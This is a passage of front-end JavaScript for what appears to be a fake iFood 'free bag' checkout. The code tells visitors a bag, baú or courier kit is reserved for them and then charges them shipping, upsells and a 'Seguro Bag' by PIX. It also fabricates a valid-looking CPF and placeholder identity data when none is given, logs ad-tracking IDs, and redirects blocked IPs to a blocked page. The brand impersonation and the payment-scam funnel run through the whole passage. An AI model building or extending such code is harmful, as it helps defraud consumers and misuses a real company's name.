        const raw = localStorage.getItem(STORAGE_KEYS.coupon);
        return raw ? JSON.parse(raw) : null;
    } catch (error) {
        return null;
    }
}

function clearCoupon() {
    localStorage.removeItem(STORAGE_KEYS.coupon);
}

function buildShippingOptions(rawCep) {
    const coupon = loadCoupon();
    const amountOff = Number(coupon?.amountOff || 0) || roundMoney(25.9 * Number(coupon?.discount || 0));
    const baseOptions = [
        {
            id: 'economico',
            name: 'Envio Econômico iFood',
            price: 19.9,
            eta: '5 a 8 dias úteis'
        },
        {
            id: 'padrao',
            name: 'Envio Padrão iFood',
            price: 25.9,
            eta: '3 a 5 dias úteis'
        },
        {
            id: 'expresso',
            name: 'Envio Prioritário iFood',
            price: 29.9,
            eta: '1 a 3 dias úteis'
        }
    ];

    return baseOptions.map((opt) => {
        const original = Number(opt.price || 0);
        const discounted = amountOff ? Math.max(0, roundMoney(original - amountOff)) : original;
        return {
            ...opt,
            originalPrice: amountOff ? original : null,
            price: discounted,
            discountApplied: amountOff > 0
        };
    });
}

function resolveRewardById(value = '') {
    const id = String(value || '').trim().toLowerCase();
    if (!id || !Object.prototype.hasOwnProperty.call(REWARD_CATALOG, id)) return null;
    return { ...REWARD_CATALOG[id] };
}

function resolveRewardSelection(value = null) {
    if (value === undefined || value === null || value === '') return null;
    const source = value && typeof value === 'object' && !Array.isArray(value)
        ? value
        : { id: value };
    const reward = resolveRewardById(source?.id || source);
    if (!reward) return null;
    const selectedAt = Number(source?.selectedAt || 0);
    return {
        ...reward,
        selectedAt: selectedAt > 0 ? selectedAt : 0
    };
}

function getRewardExtraPrice(reward = null) {
    return Number(reward?.checkoutExtraPrice || reward?.extraPrice || reward?.rewardExtraPrice || 0);
}

function getRewardCheckoutCopy(reward = null) {
    const resolvedReward = resolveRewardSelection(reward || 'bag') || resolveRewardById('bag');
    switch (String(resolvedReward?.id || 'bag')) {
        case 'bau':
            return {
                title: 'Seu baú já está reservado',
                subtitle: 'Falta só 1 passo para receber seu baú do iFood',
                cta: 'Receber meu Baú agora'
            };
        case 'kit_entregador':
            return {
                title: 'Seu kit de entregador já está reservado',
                subtitle: 'Falta só 1 passo para receber seu kit de entregador do iFood',
                cta: 'Receber meu Kit agora'
            };
        default:
            return {
                title: 'Sua bag já está reservada',
                subtitle: 'Falta só 1 passo para receber sua bag do iFood',
                cta: 'Receber minha Bag agora'
            };
    }
}

function saveRewardSelection(data) {
    const reward = resolveRewardSelection(data);
    if (!reward) {
        clearRewardSelection();
        return;
    }
    const payload = {
        id: reward.id,
        selectedAt: reward.selectedAt > 0 ? reward.selectedAt : Date.now()
    };
    localStorage.setItem(STORAGE_KEYS.reward, JSON.stringify(payload));
}

function loadRewardSelection() {
    try {
        const raw = localStorage.getItem(STORAGE_KEYS.reward);
        if (!raw) return null;
        const parsed = JSON.parse(raw);
        const reward = resolveRewardSelection(parsed);
        if (!reward) {
            localStorage.removeItem(STORAGE_KEYS.reward);
            return null;
        }
        return reward;
    } catch (_error) {
        return null;
    }
}

function clearRewardSelection() {
    localStorage.removeItem(STORAGE_KEYS.reward);
}

function saveShipping(data) {
    localStorage.setItem(STORAGE_KEYS.shipping, JSON.stringify(data));
}

function loadShipping() {
    try {
        const raw = localStorage.getItem(STORAGE_KEYS.shipping);
        return raw ? JSON.parse(raw) : null;
    } catch (error) {
        return null;
    }
}

function isShippingSelectionComplete(shipping) {
    if (!shipping || typeof shipping !== 'object') return false;
    const shippingId = String(shipping.id || '').trim();
    const shippingPrice = Number(shipping.price);
    const selectedAt = Number(shipping.selectedAt || 0);
    if (!shippingId) return false;
    if (!Number.isFinite(shippingPrice) || shippingPrice < 0) return false;
    if (!selectedAt || Number.isNaN(selectedAt)) return false;
    return true;
}

function applyCouponToShipping(shipping) {
    if (!shipping) return shipping;
    const coupon = loadCoupon();
    const amountOff = Number(coupon?.amountOff || 0) || roundMoney(25.9 * Number(coupon?.discount || 0));
    if (!amountOff) return shipping;
    const base = Number(shipping.originalPrice || shipping.basePrice || shipping.price || 0);
    const discounted = Math.max(0, roundMoney(base - amountOff));
    if (discounted === shipping.price && shipping.coupon === coupon.code) return shipping;
    const updated = {
        ...shipping,
        basePrice: base,
        originalPrice: base,
        price: discounted,
        coupon: coupon.code || 'FRETE5',
        amountOff,
        discountApplied: true
    };
    saveShipping(updated);
    return updated;
}

function saveAddressExtra(data) {
    localStorage.setItem(STORAGE_KEYS.addressExtra, JSON.stringify(data));
}

function loadAddressExtra() {
    try {
        const raw = localStorage.getItem(STORAGE_KEYS.addressExtra);
        return raw ? JSON.parse(raw) : null;
    } catch (error) {
        return null;
    }
}

function saveBump(data) {
    localStorage.setItem(STORAGE_KEYS.bump, JSON.stringify(data));
}

function loadBump() {
    try {
        const raw = localStorage.getItem(STORAGE_KEYS.bump);
        return raw ? JSON.parse(raw) : null;
    } catch (error) {
        return null;
    }
}

function generateFallbackCpf(seedText) {
    const seed = String(seedText || Date.now()).replace(/\D/g, '') || '123456789';
    const digits = seed.padEnd(9, '7').slice(0, 9).split('').map((n) => Number(n));
    const calc = (base, factor) => {
        const sum = base.reduce((acc, value, index) => acc + value * (factor - index), 0);
        const mod = sum % 11;
        return mod < 2 ? 0 : 11 - mod;
    };
    const d10 = calc(digits, 10);
    const d11 = calc([...digits, d10], 11);
    return `${digits.join('')}${d10}${d11}`;
}

function getPixPersonalPayload() {
    const sessionId = getLeadSessionId();
    const personal = loadPersonal() || {};
    const phoneDigits = String(personal.phoneDigits || personal.phone || '').replace(/\D/g, '');
    const cpfDigits = String(personal.cpf || '').replace(/\D/g, '');
    const suffix = String(sessionId || Date.now()).replace(/[^a-zA-Z0-9]/g, '').slice(-8).toLowerCase() || 'lead';
    const fallbackEmail = `lead.${suffix}@ifoodbag.app`;

    return {
        name: String(personal.name || '').trim() || 'Cliente iFood',
        cpf: cpfDigits || generateFallbackCpf(sessionId),
        birth: String(personal.birth || '').trim() || '01/01/1990',
        email: String(personal.email || '').trim() || fallbackEmail,
        phone: String(personal.phone || '').trim() || '(11) 99999-9999',
        phoneDigits: phoneDigits || '11999999999'
    };
}

function getPixAddressPayload() {
    const address = loadAddress() || {};
    const cityLine = String(address.cityLine || '');
    const stateFromLine = cityLine.includes('-') ? cityLine.split('-')[1]?.trim() : '';
    const cityFromLine = cityLine.includes('-') ? cityLine.split('-')[0]?.trim() : cityLine.trim();
    return {
        ...address,
        cep: String(address.cep || '').trim(),
        street: String(address.street || '').trim() || String(address.streetLine || '').split(',')[0]?.trim() || 'Rua não informada',
        neighborhood: String(address.neighborhood || '').trim() || String(address.streetLine || '').split(',')[1]?.trim() || 'Centro',
        city: String(address.city || '').trim() || cityFromLine || 'Sao Paulo',
        state: String(address.state || '').trim() || stateFromLine || 'SP'
    };
}

function normalizeApiErrorMessage(message = '') {
    const text = String(message || '').trim();
    if (!text) return '';
    const lower = text.toLowerCase();
    if (lower.includes('sess') && (lower.includes('inv') || lower.includes('invalid'))) {
        return 'Sessao invalida. Recarregue a pagina.';
    }
    return text;
}

function looksLikeSessionError(message = '') {
    const normalized = String(message || '').toLowerCase();
    return normalized.includes('sess') && (normalized.includes('inv') || normalized.includes('invalid'));
}

function normalizePixLifecycleStatus(value = '') {
    return String(value || '')
        .trim()
        .toLowerCase()
        .replace(/\s+/g, '_')
        .replace(/-+/g, '_');
}

function canReuseRecentPixCharge(pixData, expected = {}) {
    if (!pixData || typeof pixData !== 'object') return false;

    const txid = String(pixData.idTransaction || pixData.txid || '').trim();
    if (!txid) return false;

    const status = normalizePixLifecycleStatus(
        pixData.status || pixData.statusRaw || pixData.status_transaction || ''
    );
    if (
        pixData.paidAt ||
        status === 'paid' ||
        status === 'refunded' ||
        status === 'refused' ||
        status === 'failed' ||
        status === 'expired' ||
        status === 'canceled' ||
        status === 'cancelled' ||
        status === 'chargedback' ||
        status === 'chargeback'
    ) {
        return false;
    }

    const createdAt = Number(pixData.createdAt || 0);
    if (!createdAt || Number.isNaN(createdAt)) return false;
    if (Date.now() - createdAt > (20 * 60 * 1000)) return false;

    const expectedAmount = Number(expected.amount || 0);
    const storedAmount = Number(pixData.amount || 0);
    if (expectedAmount > 0 && storedAmount > 0 && Math.abs(storedAmount - expectedAmount) > 0.01) {
        return false;
    }

    const expectedShipping = String(expected.shippingId || '').trim();
    const storedShipping = String(pixData.shippingId || '').trim();
    if (expectedShipping && storedShipping && expectedShipping !== storedShipping) {
        return false;
    }

    const expectedReward = String(expected.rewardId || '').trim();
    const storedReward = String(pixData.rewardId || pixData.reward?.id || '').trim();
    if (expectedReward && expectedReward !== storedReward) {
        return false;
    }

    if (Boolean(expected.isUpsell) !== Boolean(pixData.isUpsell)) {
        return false;
    }

    return true;
}

async function postPixCreateWithSessionRetry(payload) {
    const send = async () => {
        const response = await fetch('/api/pix/create', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            credentials: 'same-origin',
            body: JSON.stringify(payload)
        });
        const body = await response.json().catch(() => ({}));
        return { response, body };
    };

    let attempt = await send();
    if (isBlockedApiPayload(attempt?.response, attempt?.body)) {
        redirectToBlockedPage();
        return attempt;
    }
    const firstError = String(attempt?.body?.error || '').trim();
    if (!attempt.response.ok && (attempt.response.status === 401 || looksLikeSessionError(firstError))) {
        await ensureApiSession(true).catch(() => null);
        attempt = await send();
        if (isBlockedApiPayload(attempt?.response, attempt?.body)) {
            redirectToBlockedPage();
            return attempt;
        }
    }

    return attempt;
}

function loadPixCreateLock() {
    try {
        const raw = localStorage.getItem(STORAGE_KEYS.pixCreateLock);
        if (!raw) return null;
        const parsed = JSON.parse(raw);
        if (!parsed || typeof parsed !== 'object') return null;
        const key = String(parsed.key || '').trim();
        const expiresAt = Number(parsed.expiresAt || 0);
        if (!key || !expiresAt || Number.isNaN(expiresAt)) return null;
        if (expiresAt <= Date.now()) {
            localStorage.removeItem(STORAGE_KEYS.pixCreateLock);
            return null;
        }
        return { key, expiresAt };
    } catch (_error) {
        return null;
    }
}

function savePixCreateLock(lockKey) {
    if (!lockKey) return;
    const payload = {
        key: String(lockKey),
        expiresAt: Date.now() + 25000
    };
    try {
        localStorage.setItem(STORAGE_KEYS.pixCreateLock, JSON.stringify(payload));
    } catch (_error) {
        // Ignore localStorage write errors.
    }
}

function clearPixCreateLock(lockKey = '') {
    const key = String(lockKey || '').trim();
    try {
        const current = loadPixCreateLock();
        if (!current) return;
        if (!key || current.key === key) {
            localStorage.removeItem(STORAGE_KEYS.pixCreateLock);
        }
    } catch (_error) {
        // Ignore localStorage write errors.
    }
}

async function createPixCharge(shipping, bumpPrice, options = {}) {
    const isUpsell = Boolean(options?.upsell?.enabled);
    const shippingInput = shipping && typeof shipping === 'object' ? { ...shipping } : null;
    const shippingForPix = isUpsell ? shippingInput : applyCouponToShipping(shippingInput);
    const reward = resolveRewardSelection(options?.reward || loadRewardSelection() || 'bag') || resolveRewardById('bag');
    const shippingPrice = Number(shippingForPix?.price || 0);
    const rewardExtraPrice = isUpsell ? 0 : getRewardExtraPrice(reward);
    if (!shippingForPix || !Number.isFinite(shippingPrice) || shippingPrice < 0) {
        throw new Error('Selecione um frete valido antes de gerar o PIX.');
    }
    const extraChargeRaw = Number(bumpPrice || 0);
    const extraCharge = Number.isFinite(extraChargeRaw) && extraChargeRaw > 0
        ? Number(extraChargeRaw.toFixed(2))
        : 0;
    const amount = Number((shippingPrice + rewardExtraPrice + extraCharge).toFixed(2));
    const sessionId = getLeadSessionId();
    const lockKey = [
        sessionId,
        isUpsell ? 'upsell' : 'base',
        String(shippingForPix?.id || ''),
        String(reward?.id || 'bag'),
        String(amount.toFixed(2))
    ].join('|');

    const cachedPix = loadPix();
    if (canReuseRecentPixCharge(cachedPix, {
        amount,
        shippingId: shippingForPix?.id || '',
        rewardId: reward?.id || 'bag',
        isUpsell
    })) {
        setStage('pix');
        redirect('pix.html');
        return;
    }

    const existingPixCreateLock = loadPixCreateLock();
    if (existingPixCreateLock && existingPixCreateLock.key === lockKey) {
        throw new Error('Estamos finalizando seu PIX. Aguarde alguns segundos.');
    }

    if (
        state.pixCreatePromise &&
        state.pixCreateKey === lockKey &&
        (Date.now() - Number(state.pixCreateAt || 0)) < 20000
    ) {
        return state.pixCreatePromise;
    }
    savePixCreateLock(lockKey);

    const run = (async () => {
        await ensureApiSession();

        const trackEventRequested = isUpsell ? 'upsell_pix_create_requested' : 'pix_create_requested';
        const trackEventCreated = isUpsell ? 'upsell_pix_created_front' : 'pix_created_front';
        const sourceStage = String(options?.sourceStage || getStage() || document.body?.dataset?.page || '')
            .trim()
            .toLowerCase();
        const addPaymentInfoEventId = buildAddPaymentInfoEventId(sessionId);
        const payload = {
            sessionId,
            amount,
            stage: isUpsell ? 'upsell' : 'pix',
            event: trackEventRequested,
            sourceUrl: window.location.href,
            utm: getUtmData(),
            shipping: shippingForPix,
            reward: reward ? { id: reward.id } : null,
            bump: extraCharge > 0 ? { title: 'Seguro Bag', price: extraCharge } : null,
            personal: getPixPersonalPayload(),
            address: getPixAddressPayload(),
            extra: loadAddressExtra(),
            sourceStage,
            addPaymentInfoEventId,
            upsell: isUpsell ? {
                enabled: true,
                kind: String(options?.upsell?.kind || 'frete_1dia'),
                title: String(options?.upsell?.title || 'Prioridade de envio'),
                price: Number(options?.upsell?.price || extraCharge || shippingPrice || 0),
                previousTxid: String(options?.upsell?.previousTxid || ''),
                targetAfterPaid: String(options?.upsell?.targetAfterPaid || '')
            } : null
        };

        const { response: res, body: data } = await postPixCreateWithSessionRetry(payload);
        if (!res.ok) {
            const message = normalizeApiErrorMessage(data?.error || '') || 'Falha ao gerar o PIX. Tente novamente em instantes.';
            trackLead(isUpsell ? 'upsell_pix_create_failed' : 'pix_create_failed', {
                stage: isUpsell ? (String(options?.sourceStage || '').trim() || 'upsell') : 'orderbump',
                shipping: shippingForPix,
                reward,
                bump: payload.bump,
                amount
            });
            throw new Error(message);
        }

        const pixPayload = {
            ...data,
            amount,
            shippingId: shippingForPix.id,
            shippingName: shippingForPix.name,
            rewardId: String(data?.rewardId || reward?.id || 'bag'),
            rewardName: String(data?.rewardName || reward?.name || 'Bag do iFood'),
            rewardExtraPrice: Number(data?.rewardExtraPrice ?? rewardExtraPrice ?? 0),
            rewardAsset: reward?.asset || '',
            rewardAlt: reward?.pixAlt || reward?.name || '',
            bumpName: extraCharge > 0 ? 'Seguro Bag' : '',
            bumpPrice: extraCharge,
            createdAt: Date.now(),
            isUpsell,
            upsell: payload.upsell,
            reward: reward ? {
                id: String(data?.rewardId || reward.id),
                name: String(data?.rewardName || reward.name),
                checkoutExtraPrice: Number(data?.rewardExtraPrice ?? rewardExtraPrice ?? 0),
                asset: reward.asset,
                pixTitle: reward.pixTitle,
                pixAlt: reward.pixAlt
            } : null
        };
        savePix(pixPayload);
        setStage('pix');
        trackLead(trackEventCreated, {
            stage: 'pix',
            shipping: shippingForPix,
            reward,
            bump: payload.bump,
            pix: pixPayload,
            amount
        });
        redirect('pix.html');
    })();

    state.pixCreatePromise = run;
    state.pixCreateKey = lockKey;
    state.pixCreateAt = Date.now();

    return run.finally(() => {
        clearPixCreateLock(lockKey);
        if (state.pixCreateKey === lockKey) {
            state.pixCreatePromise = null;
            state.pixCreateKey = '';
            state.pixCreateAt = 0;
        }
    });
}

function savePix(data) {
    localStorage.setItem(STORAGE_KEYS.pix, JSON.stringify(data));
}

function loadPix() {
    try {
        const raw = localStorage.getItem(STORAGE_KEYS.pix);
        return raw ? JSON.parse(raw) : null;
    } catch (error) {
        return null;
    }
}

function getLeadSessionId() {
    let sessionId = safeStorageGet(localStorage, STORAGE_KEYS.leadSession) ||
        safeStorageGet(sessionStorage, STORAGE_KEYS.leadSession) ||
        readCookie(STORAGE_KEYS.leadSession) ||
        state.leadSessionFallback ||
        '';
    if (sessionId) return sessionId;

    sessionId = `${Date.now().toString(36)}-${Math.random().toString(36).slice(2, 10)}`;
    state.leadSessionFallback = sessionId;
    safeStorageSet(localStorage, STORAGE_KEYS.leadSession, sessionId);
    safeStorageSet(sessionStorage, STORAGE_KEYS.leadSession, sessionId);
    writeCookie(STORAGE_KEYS.leadSession, sessionId, 7);
    return sessionId;
}

function redirectToBlockedPage() {
    const path = String(window.location.pathname || '').toLowerCase();
    if (path.endsWith('/blocked.html') || path === '/blocked' || path.endsWith('/blocked')) {
        return;
    }
    window.location.replace('/blocked.html');
}

function isBlockedApiPayload(response, body = null) {
    if (!response || Number(response.status || 0) !== 403) return false;
    const errorText = String(body?.error || '').toLowerCase();
    return body?.blocked === true || body?.code === 'ip_blocked' || errorText.includes('bloqueado');
}

async function ensureApiSession(force = false) {
    const now = Date.now();
    const maxAgeMs = 50 * 60 * 1000;
    if (!force && state.apiSessionAt && now - state.apiSessionAt < maxAgeMs) {
        return true;
    }

    if (state.apiSessionPromise) {
        return state.apiSessionPromise;
    }

    state.apiSessionPromise = fetch('/api/site/session', {
        method: 'GET',
        cache: 'no-store',
        credentials: 'same-origin'
    })
        .then(async (res) => {
            const body = await res.json().catch(() => ({}));
            if (isBlockedApiPayload(res, body)) {
                redirectToBlockedPage();
                return false;
            }
            if (!res.ok) throw new Error('Falha ao iniciar sessão segura.');
            state.apiSessionAt = Date.now();
            return true;
        })
        .finally(() => {
            state.apiSessionPromise = null;
        });

    return state.apiSessionPromise;
}

const TRACKING_QUERY_KEYS = [
    'src',
    'sck',
    'campaign',
    'campaign_id',
    'adset',
    'adset_id',
    'ad_id',
    'placement',
    'utm_source',
    'utm_medium',
    'utm_campaign',
    'utm_term',
    'utm_content',
    'gclid',
    'fbclid',
    'ttclid',
    'ad_platform'
];

function safeStorageGet(storage, key) {
    try {
        return storage?.getItem(key) || '';
    } catch (_error) {
        return '';
    }
}

function safeStorageSet(storage, key, value) {
    try {
        storage?.setItem(key, value);
        return true;
    } catch (_error) {
        return false;
    }
}

function readCookie(name) {
    try {
        const prefix = `${encodeURIComponent(name)}=`;
        const part = String(document.cookie || '')
            .split(';')
            .map((item) => item.trim())
            .find((item) => item.startsWith(prefix));
        return part ? decodeURIComponent(part.slice(prefix.length)) : '';
    } catch (_error) {
        return '';
    }
}

function writeCookie(name, value, days = 7) {
    try {
        const maxAge = Math.max(60, Math.round(Number(days || 7) * 86400));
        document.cookie = `${encodeURIComponent(name)}=${encodeURIComponent(value || '')}; Max-Age=${maxAge}; Path=/; SameSite=Lax`;
        return true;
    } catch (_error) {
        return false;
    }
}

function pickParam(params, keys = []) {
    for (const key of keys) {
        if (params.has(key)) {
            const value = String(params.get(key) || '').trim();
            if (value) return value;
        }
    }
    return '';
}

function normalizeTrafficPlatform(value = '') {
    const raw = String(value || '').trim().toLowerCase();
    if (!raw) return '';
    if (raw === 'meta' || raw === 'facebook' || raw === 'fb' || raw === 'instagram' || raw === 'ig') return 'meta';
    if (raw === 'tiktok' || raw === 'tt' || raw === 'tik tok' || raw === 'tik_tok') return 'tiktok';
    if (raw.includes('facebook') || raw.includes('instagram') || raw.includes('meta')) return 'meta';
    if (raw.includes('tiktok')) return 'tiktok';
    return '';
}

function inferTrafficPlatform(input = {}) {
    const ttclid = String(input?.ttclid || '').trim();
    const fbclid = String(input?.fbclid || '').trim();
    const explicit = normalizeTrafficPlatform(input?.ad_platform || input?.utm_source || '');
    const referrer = String(input?.referrer || '').trim().toLowerCase();
    const userAgent = String(input?.user_agent || input?.userAgent || navigator.userAgent || '').trim().toLowerCase();

    if (ttclid) return 'tiktok';
    if (fbclid) return 'meta';
    if (explicit) return explicit;
    if (referrer.includes('tiktok')) return 'tiktok';
    if (referrer.includes('facebook') || referrer.includes('instagram') || referrer.includes('meta')) return 'meta';
    if (userAgent.includes('tiktok') || userAgent.includes('bytedance') || userAgent.includes('musical_ly')) return 'tiktok';
    if (userAgent.includes('instagram') || userAgent.includes('fb_iab') || userAgent.includes('fban') || userAgent.includes('fbav') || userAgent.includes('fbios')) return 'meta';
    return '';
}

function hasIncomingTrackingParams(params) {
    return TRACKING_QUERY_KEYS.some((key) => params.has(key));
}

function captureUtmParams() {
    const params = new URLSearchParams(window.location.search);
    const current = getUtmData();
    const hasIncomingTracking = hasIncomingTrackingParams(params);
    const updated = {
        src: pickParam(params, ['src']) || current.src,
        sck: pickParam(params, ['sck']) || current.sck,
        campaign: pickParam(params, ['campaign', 'campaign_id']) || current.campaign,
        adset: pickParam(params, ['adset', 'adset_id']) || current.adset,
        ad_id: pickParam(params, ['ad_id']) || current.ad_id,
        placement: pickParam(params, ['placement']) || current.placement,
        utm_source: pickParam(params, ['utm_source', 'src']) || current.utm_source,
        utm_medium: pickParam(params, ['utm_medium']) || current.utm_medium,
        utm_campaign: pickParam(params, ['utm_campaign', 'campaign', 'campaign_id', 'sck']) || current.utm_campaign,
        utm_term: pickParam(params, ['utm_term', 'adset', 'adset_id']) || current.utm_term,
        utm_content: pickParam(params, ['utm_content', 'ad_id', 'placement']) || current.utm_content,
        gclid: pickParam(params, ['gclid']) || current.gclid,
        fbclid: params.has('fbclid') ? params.get('fbclid') : current.fbclid,
        ttclid: params.has('ttclid') ? params.get('ttclid') : current.ttclid,
        ad_platform: pickParam(params, ['ad_platform']) || current.ad_platform,
        referrer: document.referrer || current.referrer,
        landing_page: hasIncomingTracking ? window.location.pathname : (current.landing_page || window.location.pathname)
    };
    const inferredPlatform = inferTrafficPlatform(updated);
    if (inferredPlatform) {
        updated.ad_platform = inferredPlatform;
    }
    if (hasIncomingTracking && inferredPlatform === 'meta' && !params.has('ttclid')) {
        updated.ttclid = '';
    }
    if (hasIncomingTracking && inferredPlatform === 'tiktok' && !params.has('fbclid')) {
        updated.fbclid = '';
    }
    state.utmFallback = updated;
    const serialized = JSON.stringify(updated);
    safeStorageSet(localStorage, STORAGE_KEYS.utm, serialized);
    safeStorageSet(sessionStorage, STORAGE_KEYS.utmSession, serialized);
    writeCookie(STORAGE_KEYS.utm, serialized, 7);
}

function trackPageView(page) {
    if (!page) return;
    const utm = getUtmData();
    const pixelBrowser = getPixelBrowserContext(utm);
    const pageViewEventId = getCurrentPageViewEventId(page);
    const send = () => fetch('/api/lead/pageview', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        credentials: 'same-origin',
        body: JSON.stringify({
            sessionId: getLeadSessionId(),
            page,
            sourceUrl: window.location.href,
            utm,
            fbclid: pixelBrowser.fbclid || undefined,
            fbp: pixelBrowser.fbp || undefined,
            fbc: pixelBrowser.fbc || undefined,
            pageViewEventId
        }),
        keepalive: true
    });

    ensureApiSession().then(async () => {
        let response = await send().catch(() => null);
        if (response?.status === 401) {
            await ensureApiSession(true).catch(() => null);
            response = await send().catch(() => null);
        }
        if (response?.status === 403) {
            redirectToBlockedPage();
            return;
        }
        if (!response || response.ok) {
            return;
        }
        if (response.status >= 500) {
            // Avoid noisy retries for temporary backend errors.
            return;
        }
    }).catch(() => null);
}

function getUtmData() {
    const candidates = [
        safeStorageGet(localStorage, STORAGE_KEYS.utm),
        safeStorageGet(sessionStorage, STORAGE_KEYS.utmSession),
        readCookie(STORAGE_KEYS.utm)
    ];
    for (const raw of candidates) {
        try {
            const parsed = raw ? JSON.parse(raw) : null;
            if (parsed && typeof parsed === 'object') {
                state.utmFallback = parsed;
                return parsed;
            }
        } catch (_error) {
            // Try the next attribution store.
        }
    }
    return state.utmFallback || {};
}

async function ensureSiteConfig(force = false) {
    const now = Date.now();
    const maxAgeMs = 5 * 60 * 1000;
    if (!force && state.siteConfig && now - state.siteConfigAt < maxAgeMs) {
        return state.siteConfig;
    }
    try {
        const res = await fetch('/api/site/config', { cache: 'no-store' });
        const data = await res.json().catch(() => ({}));
        if (isBlockedApiPayload(res, data)) {
            redirectToBlockedPage();
            return { blocked: true };
        }
        if (!res.ok) throw new Error('config');
        state.siteConfig = data || {};
        state.siteConfigAt = Date.now();
        state.pixelConfig = data?.pixel || null;
        state.pixelConfigAt = Date.now();
        state.tiktokPixelConfig = data?.tiktokPixel || null;
        state.tiktokPixelConfigAt = Date.now();
        localStorage.setItem(STORAGE_KEYS.pixelConfig, JSON.stringify(state.pixelConfig));
        localStorage.setItem(STORAGE_KEYS.tiktokPixelConfig, JSON.stringify(state.tiktokPixelConfig));
        return state.siteConfig;
    } catch (_error) {
        try {
            const cachedPixel = localStorage.getItem(STORAGE_KEYS.pixelConfig);
            const cachedTikTokPixel = localStorage.getItem(STORAGE_KEYS.tiktokPixelConfig);
            if (cachedPixel) {
                state.pixelConfig = JSON.parse(cachedPixel);
                state.pixelConfigAt = Date.now();
            }
            if (cachedTikTokPixel) {
                state.tiktokPixelConfig = JSON.parse(cachedTikTokPixel);
                state.tiktokPixelConfigAt = Date.now();
            }
            if (state.pixelConfig || state.tiktokPixelConfig) {
                return {
                    pixel: state.pixelConfig,
                    tiktokPixel: state.tiktokPixelConfig
                };
            }
        } catch (_e) {}
        return null;
    }
}

async function ensurePixelConfig(force = false) {
    const site = await ensureSiteConfig(force);
    return site?.pixel || state.pixelConfig || null;
}

async function ensureTikTokPixelConfig(force = false) {
    const site = await ensureSiteConfig(force);
    return site?.tiktokPixel || state.tiktokPixelConfig || null;
}

async function isOrderBumpEnabled() {
    const site = await ensureSiteConfig(false);
    const enabled = site?.features?.orderbump;
    return enabled !== false;
}

function loadFacebookPixel(pixelId) {
    const id = String(pixelId || '').trim();
    if (!id) return;

    if (!window.__ifoodPixelInits || typeof window.__ifoodPixelInits !== 'object') {
        window.__ifoodPixelInits = {};
    }

    /* eslint-disable */
    if (!window.fbq) {
        !function(f,b,e,v,n,t,s){
            if(f.fbq)return;n=f.fbq=function(){n.callMethod?
            n.callMethod.apply(n,arguments):n.queue.push(arguments)};
            if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
            n.queue=[];t=b.createElement(e);t.async=!0;
            t.src=v;s=b.getElementsByTagName(e)[0];
            s.parentNode.insertBefore(t,s)
        }(window, document,'script','https://connect.facebook.net/en_US/fbevents.js');
    }
    /* eslint-enable */

    if (window.__ifoodPixelInits[id]) return;
    try {
        // Disable Meta automatic events (e.g. SubscribedButtonClick auto-detected).
        window.fbq('set', 'autoConfig', false, id);
        window.fbq('init', id);
        window.__ifoodPixelInits[id] = true;
    } catch (_error) {}
}

function getTikTokTracker(pixelId = '') {
    const id = String(pixelId || '').trim();
    if (!id || !window.ttq) return null;
    if (typeof window.ttq.instance === 'function') {
        return window.ttq.instance(id);
    }
    return window.ttq;
}

function loadTikTokPixel(pixelId, options = {}) {
    const id = String(pixelId || '').trim();
    if (!id) return;

    if (!window.__ifoodTikTokPixelInits || typeof window.__ifoodTikTokPixelInits !== 'object') {
        window.__ifoodTikTokPixelInits = {};
    }
    if (!window.__ifoodTikTokPixelPageViews || typeof window.__ifoodTikTokPixelPageViews !== 'object') {
        window.__ifoodTikTokPixelPageViews = {};
    }

    /* eslint-disable */
    if (!window.ttq || typeof window.ttq.load !== 'function') {
        !function(w, d, t) {
            w.TiktokAnalyticsObject = t;
            const ttq = w[t] = w[t] || [];
            ttq.methods = [
                'page', 'track', 'identify', 'instances', 'debug', 'on', 'off', 'once', 'ready',
                'alias', 'group', 'enableCookie', 'disableCookie', 'holdConsent', 'revokeConsent', 'grantConsent'
            ];
            ttq.setAndDefer = function(target, method) {
                target[method] = function() {
                    target.push([method].concat(Array.prototype.slice.call(arguments, 0)));
                };
            };
            for (let i = 0; i < ttq.methods.length; i += 1) {
                ttq.setAndDefer(ttq, ttq.methods[i]);
            }
            ttq.instance = function(pixelCode) {
                const instance = ttq._i[pixelCode] || [];
                for (let i = 0; i < ttq.methods.length; i += 1) {
                    ttq.setAndDefer(instance, ttq.methods[i]);
                }
                return instance;
            };
            ttq.load = function(pixelCode, initOptions) {
                const url = 'https://analytics.tiktok.com/i18n/pixel/events.js';
                ttq._i = ttq._i || {};
                ttq._i[pixelCode] = [];
                ttq._i[pixelCode]._u = url;
                ttq._t = ttq._t || {};
                ttq._t[pixelCode] = +new Date();
                ttq._o = ttq._o || {};
                ttq._o[pixelCode] = initOptions || {};
                const script = d.createElement('script');
                script.type = 'text/javascript';
                script.async = true;
                script.src = `${url}?sdkid=${pixelCode}&lib=${t}`;
                const firstScript = d.getElementsByTagName('script')[0];
                firstScript.parentNode.insertBefore(script, firstScript);
            };
        }(window, document, 'ttq');
    }
    /* eslint-enable */

    if (!window.__ifoodTikTokPixelInits[id]) {
        try {
            window.ttq.load(id);
            window.__ifoodTikTokPixelInits[id] = true;
        } catch (_error) {}
    }

    if (options.firePageView && !window.__ifoodTikTokPixelPageViews[id]) {
        try {
            const tracker = getTikTokTracker(id);
            if (tracker && typeof tracker.page === 'function') {
                tracker.page();
                window.__ifoodTikTokPixelPageViews[id] = true;
            }
        } catch (_error) {}
    }
}

function getCookieValue(name) {
    const needle = `${name}=`;
    const chunks = String(document.cookie || '').split(';');
    for (const raw of chunks) {
        const item = raw.trim();
        if (!item.startsWith(needle)) continue;
        return decodeURIComponent(item.slice(needle.length));
    }
    return '';
}

function getPixelBrowserContext(utm = {}) {
    const fbclid = String(utm?.fbclid || '').trim();
    const fbp = String(getCookieValue('_fbp') || '').trim();
    const cookieFbc = String(getCookieValue('_fbc') || '').trim();
    const fbc = cookieFbc || (fbclid ? `fb.1.${Date.now()}.${fbclid}` : '');
    return { fbclid, fbp, fbc };
}

function sanitizeEventIdToken(value, maxLen = 48) {
    const clean = String(value || '')
        .trim()
        .toLowerCase()
        .replace(/[^a-z0-9]/g, '');
    if (!clean) return 'session';
    return clean.slice(0, maxLen);
}

function buildLeadEventId(sessionId = '') {
    const token = sanitizeEventIdToken(sessionId || getLeadSessionId());
    return `lead_${token}`;
}

function buildPageViewEventId(page = '', sessionId = '') {
    const pageToken = sanitizeEventIdToken(page || document.body?.dataset?.page || 'page', 24);
    const sessionToken = sanitizeEventIdToken(sessionId || getLeadSessionId(), 24);
